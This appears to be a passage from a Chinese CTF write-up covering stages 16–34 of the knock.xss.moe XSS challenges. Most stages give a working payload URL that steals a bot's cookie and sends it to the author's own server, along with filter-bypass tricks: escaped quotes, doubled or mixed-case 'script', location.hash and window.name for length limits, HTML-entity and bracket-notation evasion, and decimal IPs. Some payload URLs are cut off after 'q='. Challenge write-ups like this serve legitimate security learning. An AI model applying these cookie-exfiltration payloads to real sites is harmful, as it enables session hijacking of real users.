很容易想到用JavaScript伪协议  
payload
    http://86620d66a1b474c588ef787b711b0f1d8843a1af.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${parent.document.cookie}`
## stage17
和stage16一样
payload
    http://34a131df991487bf58d3df0a85e247d396fb93a0.knock.xss.moe/?q=javascript:document.location=`http://134.175.33.164:1234/?${parent.document.cookie}`
## stage18
尝试代码注入
发现给单引号前面加了一个`\`，但是我们在单引号前面再加一个`\`吃掉它
最终payload
    http://c6a860d0948320766d5c4d8dc3bbdcdf9dd95884.knock.xss.moe/?q=1\');document.location=`http://134.175.33.164:1234/?${document.cookie}`;//
## stage19
尝试代码注入
但是我发现我用这个payload老是打不到cookie
    http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=XSS%27);window.open(`http://134.175.33.164:1234/?${document.cookie}`);//
然后发现，必须要我把前面那个xss的弹窗点了之后后面的js代码才会触发，然而后台的bot并不会点击弹窗，所以才导致我们后面的代码不会执行，所以我们的利用点必须是在alert里面，尝试一波发现alert里面可以用其它函数，原因不明，有知道的师傅还请科普  
最终payload
    http://224d0c5677307d743ba90c8f81e42f5be648cd97.knock.xss.moe/?q=XSS',window.open(`http://134.175.33.164:1234/?${document.cookie}`));//
## stage20
发现script被替换为空，双写script即可绕过  
payload
    http://303f34eb0a974a432254a4cb2d6e07fa6f8b0b7f.knock.xss.moe/?q=document.location=`http://134.175.33.164:1234/?${document.cookie}`
## stage21
和上一题差不多，只不过这题双写script没有用，但是我们可以用大小写绕过，但是发现无论怎么样都收不到cookie，查看一波响应头，发现  
> X-XSS-Protection:1;mode=block,这里使用了XSS过滤，如果检测到攻击，就会浏览器会阻止页面渲染
但是它会把script替换为空，所以我们可以利用script混淆代码，导致浏览器检测不出xss；  
payload
    http://49ab9ff165cd76ffe06af0b72f450c82f35db396.knock.xss.moe/?q=
## stage22
22关发现有长度限制  
发现最大长度是65  
标签首先考虑用svg比较合适，然后用`//`代替`http://`，IP使用十进制ip  
刚好65个踩点，最后payload
    http://bcd699e871d46c191f3c43a7197c18440b308507.knock.xss.moe/?q=
## stage23
这题限制55个字符  
我们可以使用`location.hash`，然后``，最后在`#`后面再加上我们的payload
长度41，没毛病
最终payload
    http://51b123fbd6a21b3cf43f49e0a1014221e191c7db.knock.xss.moe/?q=#window.open(`http://134.175.33.164:1234/?${document.cookie}`)
## stage24
这关限制字符45，但是stage23的payload仍然能用
    http://1498f071159fd60222c0e7e82b7b6ff046e9e52e.knock.xss.moe/?q=#window.open(`http://134.175.33.164:1234/?${document.cookie}`)
## stage25
这关限制35个字符，这还让不让人活了。这题前前后后搞了一小时，弄得我头皮发麻，无奈查了很多Short XSS，功夫不负有心人，发现了一片新天地
既然后台的bot是直接加载我们提交的URL，那么我们尝试在我们vps上部署以下代码
    window.name = "location.href=`http://134.175.33.164:1234/?${parent.document.cookie}`";
    location.href = "http://8e67e39d7e01213d5551c696ef8641b625cc8dd7.knock.xss.moe/?q=";
然后把我的vps的链接直接提交过去
Getflag  
## stage26
这题回把我们payload全部转化为大写，但是js中的函数是区分大小写的，但是我们可以用HTML实体编码绕过，然后再urlencode，不然浏览器会把`#`后面当作描点  
payload
    http://89078a2f1f0b7d9f210b1876f4b20ada0a090ebb.knock.xss.moe/?q=
## stage27
这题把`.`给过滤了，但是我们可以用数组的形式表示：window['open'],document['cookie']，  
URL中的点的话，我们有两种方法，第一种方法是把ip地址转化为十进制ip地址，第二种方法是把url中的`.`换成中文的句号，浏览器会把中文的句号自动转化成`.`  
payload：
    第一种:
    http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=
    第二种：
    http://295a1d900c5bf618101abf69083622d0f69aded1.knock.xss.moe/?q=
## stage28
这题比上一题多了一个过滤了双引号和单引号，但是我们可以用反引号绕过  
payload
    http://02f6f47ddaa7b22137a74843f2c4f1ac915dda3b.knock.xss.moe/?q=
## stage29
这题过滤了括号和`.`，用`document['location']`就ok了  
payload
    http://a4bf8393a4159b94aa4b84e9a134d5e6140f3c34.knock.xss.moe/?q=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`
## stage30
和上一题一毛一样
    http://ebf510ac2d79576cd5b7d45412eaf3eed1781bd0.knock.xss.moe/?q=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`
## stage31-34(这四题一毛一样)
这题过滤了`>`，但是没有过滤掉`<`，但是`<svg/onload=alert(1)`不需要闭合尖括号也可以执行
payload
    http://bb84607f02113a22396438c9a67e4c5abdfd6561.knock.xss.moe/?q=%3Csvg/onload=document[`location`]=`http://2259624356:1234/?${document[`cookie`]}`//%3E
# 总结
虽然这些题目并不是很难，但是套路还是很多的，学到了不少东西